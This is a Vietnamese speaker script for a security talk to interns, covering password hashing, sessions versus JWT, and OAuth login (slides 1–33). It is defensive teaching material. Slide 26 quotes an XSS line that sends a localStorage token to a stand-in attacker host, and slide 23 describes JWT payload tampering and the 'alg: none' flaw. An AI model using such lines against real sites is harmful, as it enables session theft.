# Kịch bản nói — Authentication & Authorization

Mỗi slide một mục, theo đúng thứ tự deck (số slide = số ở footer, `12 / 56`). **Nói** là phần bạn
dẫn; các dòng **→ k** là những `data-step` (bấm mũi tên phải rồi nói dòng đó, kèm thứ vừa hiện
ra trên màn hình); **Chốt** là câu để lại trong đầu mọi người trước khi qua slide tiếp theo.
Thời gian ghi ở đầu mỗi slide là ước lượng, `⏱ tới m:ss` là đồng hồ tích luỹ khi rời slide đó.

Không có gì ở đây hiện trên màn hình. Số liệu thì lấy slide làm chuẩn — sửa số trên slide thì
nhớ sửa luôn ở đây. Người nghe là intern: biết HTTP, REST, viết được API CRUD, nhưng chưa từng tự
làm login. Nói chậm, hỏi khán phòng nhiều, thuật ngữ kỹ thuật giữ nguyên tiếng Anh.

## Trước khi bắt đầu

- Mở deck qua HTTP (`cd presentation && python3 -m http.server 8000`, mở `http://localhost:8000`),
  bấm `F` để fullscreen.
- Phím: `→` / `←` để step, `O` xem overview, `T` đổi theme sáng.
- Chuẩn bị sẵn Kahoot (câu hỏi trong `presentation/notes/kahoot-questions.md`, 12 câu), mở game ở
  một tab khác để lấy PIN cho slide 56.

## Thời lượng

| Phần | Slide | Dự kiến | Đồng hồ |
|---|---|---|---|
| Cover + outline + 00 Giới thiệu | 1–8 | 5 phút | 0:00 → 5:00 |
| 01 Mật khẩu | 9–17 | 9 phút | 5:00 → 14:00 |
| 02 Session & JWT | 18–27 | 10 phút | 14:00 → 24:00 |
| 03 Login with Google | 28–36 | 10 phút | 24:00 → 34:00 |
| 04 Service-to-service | 37–48 | 12 phút | 34:00 → 46:00 |
| 05 Phân quyền & attack | 49–55 | 7 phút | 46:00 → 53:00 |
| Cảm ơn: Q&A + Kahoot | 56 | ~10 phút | 53:00 → ~63:00 |

Có 10 slide **"Your turn"** (5, 11, 14, 19, 22, 25, 39, 43, 45, 51), mỗi slide ~1 phút: đọc câu
hỏi, chờ ~30 s cho mọi người bàn với người bên cạnh, nghe 1–2 câu trả lời, rồi `→` lật đáp án. Nhờ
vậy phần nói dài **~53 phút**, cộng ~10 phút Q&A + Kahoot.

**Nếu bị trễ** (theo thứ tự, cắt cái trên trước):
1. **3.7 MFA (slide 35):** chỉ đọc tiêu đề và câu "TOTP mặc định tốt, SMS yếu nhất, passkey mạnh
   nhất", bỏ qua bảng — phần này intern quen nhất. Tiết kiệm ~1 phút.
2. **4.2 API key vs Client Credentials (slide 40):** chỉ nói hàng "if it leaks" rồi qua 4.3 — slide
   4.8 nhắc lại cùng ý. Tiết kiệm ~1 phút.
3. **Rút ngắn "Your turn":** thời gian chờ xuống ~15 s và chỉ nghe một câu trả lời, đừng bỏ hẳn: đó là
   lúc cả phòng được nói. 10 slide × 30 s = ~5 phút.
4. Các slide "Do / Don't" (17, 27, 36, 48): chỉ đọc tiêu đề và một hàng, vì slide 55 gom lại hết.
5. 5.4 (slide 54) vốn là slide tự học: chỉ cần "chụp lại, tối về bấm link làm lab".

---

# Phần 0 — Giới thiệu · ⏱ 0:00 → 5:00

### 1 · Cover — Authentication & Authorization
_~30 s · ⏱ tới 0:30_

**Nói:** Chào mọi người, mình là Trúc. Hôm nay mình nói về authentication và authorization — hai
chữ nghe giống nhau, nhưng là hai câu hỏi khác nhau. Mỗi request vào API của mình, trước khi đụng
tới database, phải trả lời được: ai gửi request này, và người đó có được phép làm việc này không.
**Chỉ lên hình:** một viewer gọi `DELETE /users/42`. Bước AuthN qua — server biết đó là ai. Bước
AuthZ thì không — viewer không được xoá user, nên trả `403 Forbidden`. Cuối buổi, cả phòng sẽ
giải thích được vì sao là `403` chứ không phải `401`.

### 2 · Outline — Who are you, what can you do, and how attackers skip both.
_~20 s · ⏱ tới 0:50_

**Nói:** Năm phần sau phần giới thiệu. Mật khẩu, rồi làm sao server nhớ mình đã login — session
cookie với JWT. Sau đó là nút "Login with Google", với Claude làm ví dụ thật. Phần bốn bỏ người dùng
đi: service gọi service thì chứng minh mình là ai thế nào. Phần năm là phân quyền, và bốn attack kinh
điển để các bạn tự học.
**Chốt:** Có gì thắc mắc thì hỏi luôn nha, đừng để dồn tới cuối.

### 3 · Divider 00 — Introduction
_~10 s · ⏱ tới 1:00_

**Nói:** Bắt đầu bằng hai câu hỏi mà request nào cũng phải trả lời, và hai status code đi kèm.

### 4 · With no checks, anyone who knows the URL can delete user 42
_~50 s · ⏱ tới 1:50_

**Nói:** Đây là kiểu endpoint mà tuần đầu đi làm ai cũng viết: `app.delete("/users/:id")`, xoá rồi
trả `204`. Hỏi cả phòng: code này có bug không? (Chờ vài giây.) Nó chạy đúng y như những gì nó viết
— cho bất kỳ ai gọi nó.
**→ 1:** Một người lạ, không login, không token, gõ đúng một lệnh `curl -X DELETE`. Server trả
`204 No Content` — user 42 bay màu. Bug ở đây là server chưa bao giờ hỏi ai đang gửi request, và
người đó có được làm vậy không.
**→ 2:** Hai câu hỏi. Một: bạn là ai — admin đã login, một khách hàng, hay không ai cả? Hai: bạn có
được làm việc này không — xoá *đúng user này*, ngay bây giờ?
**Chốt:** Request nào cũng phải trả lời đủ hai câu, trước khi chạm tới database.

### 5 · Your turn — AuthN and AuthZ: what's the difference? Which one runs first?
_~60 s · ⏱ tới 2:50_

**Nói:** Hai câu hỏi ở slide trước đều có tên tiếng Anh, và các bạn chắc đã nghe: AuthN với AuthZ.
Đọc to: khác nhau chỗ nào, và cái nào chạy trước? Câu hỏi mở, không có đáp án gợi ý. "30 giây, bàn
với người ngồi cạnh." Chờ ~30 s, đừng lấp khoảng lặng. Mời 1–2 người trả lời, hỏi "vì sao?" nhưng chưa
nói đúng sai. Ai đáp "AuthZ trước" thì hỏi lại: "chưa biết người ta là ai thì kiểm quyền của ai?"
**→ 1:** AuthN kiểm *bạn là ai* — password, mã OTP, hay Google. AuthZ quyết định *bạn được làm gì* —
viewer không được xoá user. Và AuthN luôn chạy trước.
**Chốt:** "Giờ đặt hai cái cạnh nhau, kèm một ví von để nhớ."

### 6 · Authentication finds out who you are. Authorization decides what you may do.
_~50 s · ⏱ tới 3:40_

**Nói:** Đúng như cả phòng vừa trả lời. Bên trái là **AuthN** — authentication — *bạn là ai?* Chứng
minh danh tính bằng password, mã 6 số trên điện thoại, hay "Login with Google". Kết quả: server biết
`user_id = 42`, hoặc không biết gì. Bên phải là **AuthZ** — authorization — *bạn được làm gì?* Server
đã biết bạn là ai, giờ kiểm tra luật: `viewer` được xem danh sách user nhưng không được xoá. Kết quả:
cho, hoặc không cho.
Ví von khách sạn cho dễ nhớ: lễ tân kiểm CCCD trước khi đưa thẻ phòng — đó là AuthN. Thẻ phòng chỉ
mở phòng 702, không mở 703, không mở phòng nhân viên — đó là AuthZ.
**→ 1:** Và như vừa nghe: thứ tự luôn là AuthN trước. Chưa biết người ta là ai thì không thể quyết
định người ta được làm gì.

### 7 · 401 means "log in first". 403 means "logging in again will not help".
_~50 s · ⏱ tới 4:30_

**Nói:** Hai câu hỏi đó ứng với hai status code mà các bạn sẽ gặp trong network tab suốt. Bên trái:
gọi `/admin/users` mà không có cookie, không có header `Authorization` → `401 Unauthorized`. AuthN
fail: server không biết bạn là ai — token thiếu, hết hạn, hoặc giả. Cái tên `Unauthorized` gây hiểu
lầm, thật ra nó nghĩa là *unauthenticated*. Frontend nhận `401` thì đưa user về trang login.
Bên phải: token hợp lệ, role viewer → `403 Forbidden`. AuthZ fail: server biết bạn là user 42, là
viewer, và viewer không được làm việc này. Login lại thì vẫn là user đó, vẫn câu trả lời đó.
Frontend hiện "You don't have access", đừng redirect.
**→ 1:** Bug hay gặp: trả `401` cho một viewer đã login. Frontend đá họ về login, họ login lại, gọi
lại, lại `401` — vòng lặp vô tận.
**Chốt:** `401` = chưa biết bạn là ai. `403` = biết rồi, vẫn không cho.

### 8 · Every request passes two checkpoints before it reaches the database
_~30 s · ⏱ tới 5:00_

**Nói:** Ghép lại thành một request. Browser gửi kèm một "vé" — `Cookie: sid=…` hoặc
`Authorization: Bearer eyJ…`. Trạm đầu là auth middleware: bạn là ai? Không có vé hợp lệ → `401`.
Trạm hai là route handler: bạn có được làm không? Biết bạn rồi mà không được → `403`. Qua cả hai
mới tới database.
**→ 1:** Đây cũng là bản đồ của cả buổi: section 1 tới 3 là AuthN của người dùng — mật khẩu, server
nhớ bạn bằng cách nào, rồi "Login with Google". Section 4 vẫn là AuthN, nhưng giữa các service. Section 5
là AuthZ, cộng bốn attack để tự học.

---

# Phần 1 — Mật khẩu · ⏱ 5:00 → 14:00

### 9 · Divider 01 — Passwords
_~10 s · ⏱ tới 5:10_

**Nói:** Bắt đầu từ trạm đầu tiên. Mục tiêu của phần này: lưu password sao cho lỡ database bị lộ thì
cũng không lộ gì dùng được.

### 10 · A leaked database must not leak passwords
_~60 s · ⏱ tới 6:10_

**Nói:** Phiên bản đầu tiên, rất tự nhiên: bảng `users` có cột `email` và `password`, lưu nguyên văn.
Hỏi phòng: có ai từng thấy, hoặc từng viết, bảng như vầy chưa? (Cười nhẹ, không cần ai giơ tay.)
Vấn đề: ai nhìn thấy bảng này là thấy mọi password. Một file backup quên trên S3, một lỗi SQL
injection, một đồng nghiệp có quyền read — vậy là đủ.
**→ 1:** Còn tệ hơn: người ta xài lại password. `Dung@1998` của chị Dung nhiều khả năng cũng mở được
Gmail và app ngân hàng của chị ấy. Mình làm lộ không chỉ app của mình.
**→ 2:** Luật: không bao giờ lưu password gốc. Kể cả "chỉ là môi trường dev" — database dev hay bị
copy về laptop, bị share trong Slack.

### 11 · Your turn — Encryption vs hashing: what's the difference, and which one for passwords?
_~60 s · ⏱ tới 7:10_

**Nói:** Lưu nguyên văn là không được rồi. Vậy thay vào đó mình làm gì? Đọc to câu hỏi: encryption
với hashing khác nhau chỗ nào, và password thì dùng cái nào? Câu hỏi mở, không có đáp án gợi ý.
"30 giây, bàn với người ngồi cạnh." Chờ ~30 s, đừng lấp khoảng lặng. Mời 1–2 người trả lời, hỏi
"vì sao?" nhưng chưa nói đúng sai. Có người nói "encrypt" thì hỏi lại: "key để giải mã nằm ở đâu?"
**→ 1:** Hash. Encryption có key là mở ngược lại được; hash thì không đảo ngược được. Nhưng
không phải hash bằng SHA-256 — mấy slide sau sẽ thấy vì sao.
**Chốt:** "Giờ xem kỹ hai cái này khác nhau thế nào."

### 12 · Encryption can be undone with a key. A hash cannot be undone at all.
_~60 s · ⏱ tới 8:10_

**Nói:** Vậy mã hoá nó lại là xong? Không. Hai thứ hay bị nhầm. Encryption là hai chiều: khoá lại,
có key là mở ra được — `decrypt(…, key)` ra lại `"hunter2"`. Mà key phải nằm trên chính server đọc
database, nên attacker lấy được cái này thường lấy được luôn cái kia. Encryption dùng cho data mình
cần đọc lại: API key của đối tác, số tài khoản ngân hàng.
Hashing là một chiều: cùng input thì ra cùng một "dấu vân tay", và không có hàm `unhash()`. Lúc
login, mình hash cái user vừa gõ rồi so với hash đã lưu — trùng hash là trùng password. Mình không
bao giờ cần đọc lại password, chỉ cần kiểm tra.
**→ 1:** Nên password thì hash, không encrypt. Nhưng như slide sau sẽ thấy: không phải hash bằng
`sha256`.

### 13 · With SHA-256, the same password gives the same hash, and attackers already have a lookup table
_~80 s · ⏱ tới 9:30_

**Nói:** Để ý thanh tiến trình ở trên — mình đi từ plaintext, giờ tới SHA-256, rồi salt, rồi bcrypt.
Bảng này lưu `sha256(password)`. Nhìn An và Bình: hai hash giống y hệt nhau. Vậy là hai người cùng
password. Crack một người là có luôn người kia.
**→ 1:** Còn tệ hơn: có sẵn rainbow table — bảng tra `hash → password`, hash sẵn hàng tỷ password
phổ biến, share đầy trên mạng. `8d969eef…` tra ra `123456` ngay. Không phải crack, mà là *tra*.
Không giây nào.
**→ 2:** Thêm nữa, SHA-256 và MD5 được thiết kế để *nhanh*. Một con GPU chơi game thử khoảng 10 tỷ
hash mỗi giây. Mọi password 8 chữ thường: 26⁸, khoảng 209 tỷ lần đoán — tầm 21 giây.
**Chốt:** Hash nhanh là tin tốt cho checksum file, tin xấu cho password.

### 14 · Your turn — An and Binh both typed 123456. How do we make their stored hashes different?
_~60 s · ⏱ tới 10:30_

**Nói:** Quay lại An và Bình ở slide trước: cùng gõ `123456`, cùng một hash. Làm sao để hash lưu
trong DB của hai người khác nhau? A: hash hai lần. B: thêm một giá trị random cho mỗi user. C: bắt
đặt password mạnh hơn. "30 giây, hỏi người bên cạnh." Chờ ~30 s, rồi nghe 1–2 câu. Ai chọn A: "hash
hai lần thì An với Bình còn giống nhau không?" (Vẫn giống.) Ai chọn C: tốt, nhưng vẫn sẽ có người
xài `123456`, và hai hash vẫn trùng.
**→ 1:** B. Một chuỗi random riêng cho mỗi user, lưu ngay cạnh hash. Nó có tên: **salt**.
**Chốt:** "Xem salt làm gì với cái bảng này."

### 15 · A random salt per user makes the same password hash differently every time
_~70 s · ⏱ tới 11:40_

**Nói:** Bước tiếp theo trên thanh: salt. Salt là một chuỗi random tạo riêng cho từng user lúc
đăng ký, lưu ngay cạnh hash. Nó không phải bí mật. Giờ mình hash `salt + password`. An và Bình vẫn
cùng gõ `123456`, nhưng hai hash khác hẳn nhau — nhìn bảng không đoán ra được gì.
**→ 1:** Rainbow table vô dụng, vì không ai hash sẵn chuỗi `f3a9c1e07b2d123456`. Và crack được An
cũng không nói gì về Bình — attacker phải làm lại từ đầu cho từng user.
**→ 2:** Nhưng vẫn còn một vấn đề: SHA-256 vẫn nhanh. Nhắm vào một user thôi thì GPU vẫn đoán 10 tỷ
lần mỗi giây. Hỏi phòng: vậy làm sao cho nó chậm lại? (Dẫn qua slide sau.)

### 16 · bcrypt is slow on purpose, and keeps its own salt inside the hash string
_~80 s · ⏱ tới 13:00_

**Nói:** Bước cuối: bcrypt. Đây là một chuỗi bcrypt thật, các bạn sẽ thấy nó trong database. Nhìn
qua thì như rác, nhưng nó có cấu trúc.
**→ 1:** Tách ra bốn phần. `$2b$` là thuật toán — bcrypt. `12$` là cost: 2¹², tức 4.096 vòng. Tiếp
theo là salt, 22 ký tự, random cho user này. Phần còn lại là hash 31 ký tự — salt cộng password, chạy
qua 4.096 vòng.
Nhìn code bên dưới: cùng `123456`, hai user, hai chuỗi khác nhau. Và chỉ cần **một cột** — không cần
cột salt riêng, vì `bcrypt.compare` tự đọc cost và salt ra từ chuỗi.
**→ 2:** Cost 12 là khoảng 250 ms mỗi lần hash. User login một lần, không ai thấy chậm. Nhưng với
attacker: 209 tỷ password 8 chữ đó, SHA-256 mất 21 giây trên một GPU; bcrypt mất khoảng 1.650 năm
thời gian CPU. Tăng cost lên 1 là gấp đôi thời gian. Argon2id là lựa chọn mới hơn, cùng ý tưởng.
**Chốt:** Chậm có chủ đích — chậm với attacker, không đáng kể với user.

### 17 · Let a well-known library do the hashing. Your job is to not leak anything around it.
_~60 s · ⏱ tới 14:00_

**Nói:** Mang về được gì? Mỗi hàng: bên trái đừng làm, bên phải nên làm. Đọc từ trên xuống.
- **Hash:** đừng `md5` hay `sha256` — nhanh, crack trong vài giây. Dùng `bcrypt.hash(pw, 12)`: chậm có chủ đích, có salt sẵn.
- **Compare:** đừng tự hash rồi so `==` — sót salt, lộ timing. Dùng `bcrypt.compare`, thư viện làm đúng.
- **Error:** đừng báo "No account with this email" — attacker biết email nào tồn tại. Một câu cho mọi trường hợp: "Email or password is wrong".
- **Leaks:** đừng log `req.body` hay `res.json(user)` — log luôn password, gửi luôn hash ra ngoài. Chỉ log `user.id`, chỉ trả `{ id, email }`.
- **Column:** đừng đặt tên cột `password` — nhìn như password thật. Đặt `password_hash`, nói đúng nó chứa gì.
**Chốt:** Thuật toán thì thư viện lo. Việc của mình là đừng làm rò rỉ gì xung quanh nó.

---

# Phần 2 — Giữ trạng thái đăng nhập: Session & JWT · ⏱ 14:00 → 24:00

### 18 · Divider 02 — Staying logged in
_~10 s · ⏱ tới 14:10_

**Nói:** Password đúng rồi, login xong rồi. Nhưng HTTP quên mình ngay sau mỗi request. Session
cookie và JWT là hai cách mang theo một cái "vé".

### 19 · Your turn — You logged in. On the next request, how does the server know it's still you?
_~60 s · ⏱ tới 15:10_

**Nói:** Bạn vừa login xong. Request kế tiếp, `GET /orders` — server biết đó vẫn là bạn bằng cách nào?
A: nó nhớ IP. B: bạn gửi lại password. C: bạn gửi lại thứ nó đưa cho bạn lúc login. "30 giây, bàn
với người bên cạnh." Chờ ~30 s, nghe 1–2 câu. Ai chọn A: "cả văn phòng chung một IP wifi thì sao? Đi
4G thì IP đổi liên tục." Ai chọn B: password đi theo mọi request, và mỗi request lại tốn 250 ms bcrypt.
**→ 1:** C. HTTP là **stateless** — mỗi request đến một mình, server không nhớ request trước. Nên lúc
login server phát một "vé", browser gửi kèm mọi request: session cookie hoặc JWT. Cả phần này nói về
hai loại vé đó: session cookie thì *server* nhớ bạn, JWT thì *cái vé* nhớ bạn.
**Chốt:** "Loại vé thứ nhất: session cookie."

### 20 · The cookie is only a random ID. Who you are lives in a table on the server.
_~70 s · ⏱ tới 16:20_

**Nói:** Loại thứ nhất. Login xong, server trả header `Set-Cookie: sid=9f8c…` kèm mấy flag. Từ đó
browser tự gửi `Cookie: sid=…` theo mọi request, mình không phải code gì. Ba flag quan trọng:
`HttpOnly` — JavaScript không đọc được; `Secure` — chỉ gửi qua HTTPS; `SameSite=Lax` — không gửi kèm
form post từ site khác.
Cái cookie chỉ là một ID random. "Bạn là ai" nằm ở bảng sessions trên server, Redis hoặc DB: mỗi
request đọc `sid`, tra dòng, ra `user_id = 42`. Mỗi request một lần tra.
**→ 1:** Logout thì sao? Xoá dòng đó đi. Request tiếp theo mang `sid` đó nhận `401` ngay lập tức.
**→ 2:** Về thử nha: mở DevTools → Application → Cookies. Các bạn sẽ thấy `sid`, không bao giờ thấy
password.

### 21 · A JWT carries who you are inside the token, plus a signature only the server can make.
_~70 s · ⏱ tới 17:30_

**Nói:** Loại thứ hai — chuỗi `eyJ…` các bạn sẽ thấy trong header `Authorization`. Slide này tách nó
ra ngay trong browser. Ba phần, cách nhau bằng dấu chấm, mỗi phần là base64url.
Màu thứ nhất là **header**: nói token được ký thế nào — `HS256`, tức HMAC-SHA256 với một secret chỉ
server có. Màu thứ hai là **payload** — các claim: `sub` là ai, `role` là được làm gì, `iat` là phát
lúc nào, `exp` là hết hạn sau 15 phút. Decode ngay đây bằng `atob`, y như jwt.io làm. Màu thứ ba là
**signature**: HMAC-SHA256 của header chấm payload, với secret. Chỉ server biết secret.
Điểm khác với session: request sau, server chỉ cần **kiểm tra signature**, không cần tra database.
**Chỉ vào dòng "never inside":** đừng bao giờ để trong payload password, số thẻ, CCCD, API key — ai
cầm token cũng đọc được. Base64 chỉ là viết lại byte cho vừa header, không phải ổ khoá.
**Tuỳ chọn:** có ô "paste any JWT" — nếu ai có token thật trong máy, dán vào xem. Bấm `Esc` để trả
bàn phím cho deck, `↻ sample` để quay lại token mẫu.

### 22 · Your turn — Can you read a JWT's payload without the secret? How?
_~60 s · ⏱ tới 18:30_

**Nói:** Slide vừa rồi decode payload ngay trong browser. Câu hỏi: không có secret thì có đọc được
payload của JWT không, và đọc bằng cách nào? Câu hỏi mở. "30 giây." Chờ, rồi nghe
1–2 câu. Cả phòng im thì gợi ý: "slide trước mình có dùng secret để decode không?"
**→ 1:** Có — `atob()` phần giữa, hoặc dán vào jwt.io. Ai cầm token là đọc được. Secret chỉ chống
*sửa*, không chống *đọc*.
**Chốt:** "Vậy đọc được thì sửa được không?"

### 23 · Change "viewer" to "admin" and the signature stops matching. The server answers 401.
_~80 s · ⏱ tới 19:50_

**Nói:** Attacker decode token của chính mình: `"role": "viewer"`. Sửa payload mất năm giây, vì
base64 không phải ổ khoá — ai cũng decode được, như slide 2.2.
**→ 1:** Đổi một chữ thành `"admin"`, encode lại, giữ nguyên signature cũ. Nhìn token: phần payload
mới, phần signature cũ. Nhưng signature được tạo từ payload **cũ** với secret của server. Không có
secret thì không ai tạo được signature khớp với payload mới.
**→ 2:** Mỗi request, server tính lại: `HMAC-SHA256(header.payload, secret)` ra `JQxpmG8l…`. Trong
token là `XxLJzh34…`. Không khớp → `401 Unauthorized`. Signature chống *sửa*. Chỉ vậy thôi.
**→ 3:** Bẫy này đã từng xảy ra thật: có server chấp nhận `"alg": "none"` với signature rỗng, hoặc gọi
`decode()` trong khi ý là `verify()`. Cả hai đều bỏ qua bước kiểm tra. Luôn verify bằng thư viện, và
tự chỉ định thuật toán: `algorithms: ["HS256"]`.
**Chốt:** Signature chống sửa, nhưng chỉ khi server thật sự verify nó.

### 24 · Sessions are easy to cancel. JWTs are easy to check without a database. Pick the one you need.
_~70 s · ⏱ tới 21:00_

**Nói:** Đặt cạnh nhau. "Bạn là ai" nằm ở đâu: session — bảng trên server; JWT — trong token, ở phía
client. Mỗi request: session tra một lần theo `sid`; JWT chỉ kiểm signature, không tra. Logout hay ban
user: session — xoá dòng, có hiệu lực ngay; JWT — token vẫn chạy tới `exp`. Kích thước: session cookie
khoảng 30 ký tự, JWT 200 tới 1000. Hợp với gì: session cho web app một backend cần logout ngay; JWT cho
nhiều service tự kiểm token, hoặc mobile app.
**→ 1:** Nhược điểm lớn của JWT: không thu hồi được trước `exp`. Token bị đánh cắp vẫn chạy. Muốn có
danh sách "revoked" thì lại phải tra mỗi request — mất luôn cái lợi.
**→ 2:** Cách thường làm: `exp` thật ngắn, 15 phút, và một **refresh token** nằm trên server để xin
access token mới. Logout = server xoá refresh token; thiệt hại tối đa là phần còn lại của 15 phút.
**Chốt:** Cần logout tức thì → session. Nhiều service tự kiểm → JWT ngắn hạn.

### 25 · Your turn — Where would you keep the token in the browser?
_~60 s · ⏱ tới 22:00_

**Nói:** Có token rồi. Frontend cất nó ở đâu trong browser? A: `localStorage`. B: cookie
`HttpOnly`. C: một biến JavaScript. "30 giây, hỏi người bên cạnh — nhất là các bạn frontend." Chờ ~30 s,
nghe 1–2 câu. Thường có người chọn A vì tutorial hay làm vậy: đừng chê, hỏi lại "script nào trên trang
đọc được `localStorage`?" Ai chọn C: reload trang là mất, và script trên trang vẫn chạm tới được.
**→ 1:** B, mặc định. Bất kỳ script nào trên trang cũng đọc được `localStorage`, kể cả script attacker
chèn vào. JavaScript không đọc được cookie `HttpOnly`.
**Chốt:** "Slide sau đặt hai chỗ cạnh nhau, và cái giá của cookie."

### 26 · Any script on the page can read localStorage. No script can read an HttpOnly cookie.
_~60 s · ⏱ tới 23:00_

**Nói:** Hỏi phòng: ai đang để token trong `localStorage`? (Thường sẽ có người giơ tay — không sao, ai
cũng từng.) Bên trái: `localStorage.setItem("token", jwt)`. Mọi script trên trang đọc được nó: script
của mình, của một npm package, hoặc một script attacker nhét vào — XSS. Chỉ cần một dòng
`fetch("https://evil.example?t=" + localStorage.token)`.
Bên phải: cookie `HttpOnly`. Browser vẫn tự gửi nó theo mọi request tới API, nhưng `document.cookie`
trả về rỗng — JavaScript, kể cả script của attacker, không bao giờ thấy giá trị.
**→ 1:** Mặc định: để token trong cookie `HttpOnly; Secure; SameSite=Lax`.
**→ 2:** Đánh đổi: browser tự gửi cookie, nên mở cửa cho CSRF. `SameSite` đóng được phần lớn. XSS và
CSRF hôm nay không mổ trên sân khấu — slide 5.4 có link lab để các bạn tự làm.

### 27 · Use a library, keep tokens short-lived, and keep them out of JavaScript's reach.
_~60 s · ⏱ tới 24:00_

**Nói:** Mang về. Mỗi hàng: trái đừng làm, phải nên làm.
- **Verify:** đừng `jwt.decode` rồi tin luôn — bỏ qua signature. Dùng `jwt.verify` và ghim `algorithms: ["HS256"]`.
- **Payload:** đừng nhét password, số thẻ vào payload — ai cũng đọc được. Chỉ để `sub`, `role`, `exp`.
- **Storage:** đừng để token trong `localStorage` — script nào cũng đọc được. Dùng cookie `HttpOnly; Secure; SameSite=Lax`, JavaScript không đọc được.
- **Lifetime:** đừng cho `exp` 30 ngày — bị lộ là xài được cả tháng. Access token 15 phút, refresh token nằm trên server, logout thì xoá refresh.
- **Secret:** đừng hardcode secret rồi commit vào git — ai có nó cũng ký được token. Đọc từ `process.env.JWT_SECRET`, dài, random, mỗi env một cái.

---

# Phần 3 — "Login with Google" · ⏱ 24:00 → 34:00

### 28 · Divider 03 — Login with Google
_~10 s · ⏱ tới 24:10_

**Nói:** Cái nút ai cũng bấm hằng ngày. Ví dụ xuyên suốt phần này là Claude — app nhiều bạn đang xài.
OAuth cho một app làm việc thay bạn; OIDC thêm "bạn là ai" lên trên.

### 29 · Claude never asks for your Google password. An app that has it has all of Google, until you change it.
_~60 s · ⏱ tới 25:10_

**Nói:** Bài toán: bạn muốn Claude đọc Google Calendar để sắp lịch tuần. Bên trái là phiên bản *không
bao giờ xảy ra*: một ô chat "nhập password Gmail vào đây để mình đọc lịch". Hỏi phòng: bạn có nhập
không? (Chờ.) Có password là app đọc được Gmail, xoá file Drive, đổi số điện thoại khôi phục. Không
chỉ cái lịch.
**→ 1:** Không có nút undo: không lấy lại quyền từ riêng một app được. Đổi password là đăng xuất mọi
app, mọi thiết bị của mình.
**→ 2:** Thêm một chỗ rò rỉ: giờ app đó lưu password Google của bạn. Database của nó bị lộ là Gmail
của bạn bị lộ.
**→ 3:** Bên phải là cái thật: trong claude.ai → connectors, Google Calendar có nút **Connect**. Bấm
vào là mở `accounts.google.com`, bạn login ở *đó*. Thứ mình muốn: chỉ đọc lịch · thu hồi được theo
từng app · password **không bao giờ rời khỏi Google**.

### 30 · OAuth 2.0 hands Claude a key that opens one thing, instead of your password
_~60 s · ⏱ tới 26:10_

**Nói:** OAuth 2.0 có bốn vai. **Resource owner** — bạn, chủ cái lịch, người duy nhất được nói "đồng
ý". **Client** — Claude, muốn làm việc thay bạn; nó đăng ký với Google nên có `client_id` và
`client_secret`. **Authorization server** — `accounts.google.com`: kiểm tra password, hỏi "cho Claude
không?", phát token. **Resource server** — Gmail, Calendar, Drive API: giữ data, chỉ trả lời token hợp
lệ với đúng `scope`.
**→ 1:** Ví von chìa khoá xe. Password là chìa chính: mở cửa, mở cốp, mở hộc đồ — đưa cho nhân viên
giữ xe là đưa luôn cả chiếc xe. `access_token` với `scope=calendar.readonly` là chìa valet: chỉ nổ
máy, không làm gì khác. Nó hết hạn, và bạn thu hồi được bất cứ lúc nào trong tài khoản Google.

### 31 · Your password goes only to Google. Claude gets a one-time code and trades it for a token.
_~120 s · ⏱ tới 28:10_

**Nói:** Đây là đúng con đường khi bạn bấm "Connect", có animation. Thanh chip ở trên cho biết mình
đang ở bước nào; nút ↻ cạnh dòng chữ để chạy lại bước hiện tại. Đọc dòng chữ bên dưới hình theo từng bước.
Bước 1 chạy ngay khi vào slide: Claude trả về một **redirect** — ai đang xin, quay về đâu, xin quyền
gì (đọc lịch), và một `state` random. Browser đi theo sang Google; Claude nhớ `state=x7Kq9` để lát kiểm.
**→ 1 (log in + Allow):** Bạn gõ password **trên trang của Google**. Nó đi từ browser tới Google,
không đi đâu khác. Rồi tới **consent screen**: Google liệt kê đúng thứ Claude xin — `calendar.readonly`.
Đọc nó trước khi bấm Allow nha. Để ý: Claude không bao giờ thấy password.
**→ 2 (back with a code):** Google đưa browser về claude.ai kèm `code`. Claude kiểm `state` đúng cái
nó đã gửi. Cái `code` chưa phải token: dùng được **một lần**, trong vài phút, và chỉ đi kèm secret.
**→ 3 (code → token):** Đây là đoạn server với server — browser không bao giờ thấy. Backend của
Claude gọi thẳng Google: `code` + `client_secret`. Google kiểm cả hai, trả `access_token`. Secret
không bao giờ rời server.
**→ 4 (call the API):** Claude gọi Calendar API với `Authorization: Bearer …`. API kiểm token và
scope. Claude chỉ thấy những gì **tài khoản Google của bạn** thấy được, và chỉ phần bạn cho phép.
Thu hồi lúc nào cũng được.
**Chỉ xuống dòng ghi chú:** SPA, mobile app hay MCP client thì không giấu được `client_secret`, nên
thêm **PKCE** — một bằng chứng random dùng một lần thay cho secret. Mọi MCP client bắt buộc dùng. Chỉ
cần biết tên vậy thôi.

### 32 · Notion, Slack, GitHub, Atlassian: every Claude connector runs the same OAuth flow
_~70 s · ⏱ tới 29:20_

**Nói:** Không riêng Google. Connector Notion, Slack, GitHub, Atlassian, và bất kỳ remote MCP server
nào — đều chạy đúng năm bước vừa xem: redirect · login + Allow · code · token · gọi API. Mỗi cái
nhận token riêng. MCP là giao thức đứng sau các connector, và nó dùng **OAuth 2.1**: vẫn code flow đó,
chỉ bỏ đi mấy grant cũ rủi ro. Nhìn request bên trái: đây là thứ Claude gửi tới trang login của Notion
— `response_type=code`, `client_id`, `redirect_uri`, `state`, và hai tham số mới.
**→ 1:** `code_challenge` — đó là PKCE. Mọi MCP client phải gửi một bằng chứng dùng một lần, nên lỡ
`code` bị đánh cắp giữa đường thì cũng vô dụng.
**→ 2:** `resource=https://mcp.notion.com/mcp` — token được xin cho **đúng một server**. Và server đó
phải từ chối token làm cho ai khác. Nhớ ý này: ở section 4 nó có tên là `aud`.
**→ 3:** Thu hồi theo từng app: Google Account → third-party connections, Notion → Settings →
Connections, hoặc bấm Disconnect ngay trong Claude. Tối nay về mở thử xem mình đã cho bao nhiêu app.
**Chốt:** Học một flow, dùng cho mọi connector.

### 33 · OAuth has a few grant types: pick by who is asking
_~60 s · ⏱ tới 30:20_

**Nói:** "Grant type" là cách một app xin token. Hôm nay chỉ cần biết tên và chọn theo *ai đang xin*.
Đọc nhanh từng hàng, cột phải là chỗ các bạn đã gặp:
- **Authorization Code:** user login ở provider, app nhận code rồi đổi lấy token ở backend — connector Google của Claude, 3.3.
- **Authorization Code + PKCE:** y vậy, thêm bằng chứng một lần thay cho secret — SPA, mobile, mọi MCP client, 3.4.
- **Client Credentials:** một service tự login bằng chính nó, không có user — Orders gọi Payments, section 4.
- **Device Authorization:** thiết bị không có bàn phím hiện một mã, bạn duyệt trên điện thoại — YouTube trên smart TV, `gh auth login`.
